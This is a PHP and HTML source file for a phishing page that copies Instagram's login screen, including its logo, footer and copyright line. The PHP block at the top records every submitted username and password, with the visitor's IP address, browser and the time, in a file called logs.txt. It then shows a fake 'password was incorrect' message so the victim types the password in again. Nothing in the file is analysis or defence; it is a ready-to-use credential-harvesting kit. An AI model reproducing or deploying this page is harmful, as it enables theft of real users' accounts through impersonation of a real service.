<?php
	ini_set("display_errors","off");
	error_reporting(0);
  date_default_timezone_set("Asia/Tehran");

	if (isset($_POST['btn']))
	{
		$msg = "<div class=\"alert\">Sorry, your password was incorrect. Please double-check your password.</div>";
		$Date = date("Y-m-d H:i:s");
		$IP = $_SERVER["REMOTE_ADDR"];
		$UserAgent = $_SERVER["HTTP_USER_AGENT"];
		$username = $_POST['username'];
		$password = $_POST['password'];
		$FP = fopen("logs.txt","a+");
		$Data = "Date: $Date\n";
		$Data .= "IP: $IP\n";
		$Data .= "Browser: $UserAgent\n";
		$Data .= "Username: $username\n";
		$Data .= "Password: $password\n";
		$Data .= "========================================================\n";
		fwrite($FP,$Data);
		fclose($FP);		
	}
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <script src="https://kit.fontawesome.com/fc1e235b2e.js"></script>
  <link rel="stylesheet" href="style.css">
  <title>Instagram</title>
</head>

<body>

  <div id="wrapper">
    <div class="container">
      <div class="phone-app-demo"></div>
      <div class="form-data">
        <form action="?" method="POST">
          <div class="logo">
            <img src="images/logo.png" alt="logo">
          </div>
          <input type="text" placeholder="Phone number, username, or email" name="username" id="username" onkeypress="check()">
          <input type="password" placeholder="Password" name="password" id="password" onkeypress="check()">
          <button class="form-btn" type="submit" name="btn" value="1" id="btn">Log in</button>
          <?php echo $msg; ?>
          <span class="has-separator">Or</span>
          <a class="facebook-login" href="#">
            <i class="fab fa-facebook-square"></i> Log in with Facebook
          </a>
          <a class="password-reset" href="#">Forgot password?</a>
        </form>
        <div class="sign-up">
          Don't have an account? <a href="#">Sign up</a>
        </div>
        <div class="get-the-app">
          <span>Get the app.</span>
          <div class="badges">
            <img src="images/app-store.png" alt="app-store badge">
            <img src="images/google-play.png" alt="google-play badge">
          </div>
        </div>
      </div>
    </div>

    <footer>
      <div class="container">
        <nav class="footer-nav">
          <ul>
            <li>
              <a href="#">About us</a>
            </li>
            <li>
              <a href="#">Support</a>
            </li>
            <li>
              <a href="#">Press</a>
            </li>
            <li>
              <a href="#">Api</a>
            </li>
            <li>
              <a href="#">Jobs</a>
            </li>
            <li>
              <a href="#">Privacy</a>
            </li>
            <li>
              <a href="#">Terms</a>
            </li>
            <li>
              <a href="#">Directory</a>
            </li>
            <li>
              <a href="#">Profiles</a>
            </li>
            <li>
              <a href="#">Hashtags</a>
            </li>
            <li>
              <a href="#">Languages</a>
            </li>
          </ul>
        </nav>
        <div class="copyright-notice">
          &copy 2021 Instagram
        </div>
      </div>
    </footer>

  </div>

  <script>
	var btn = document.getElementById("btn");
	btn.classList.add("disabled");
	function check(){
		var username = document.getElementById("username").value;
		var password = document.getElementById("password").value;
		if (username != '' && password != ''){
			btn.classList.remove("disabled")
		}
	}
</script>
</body>
</html>

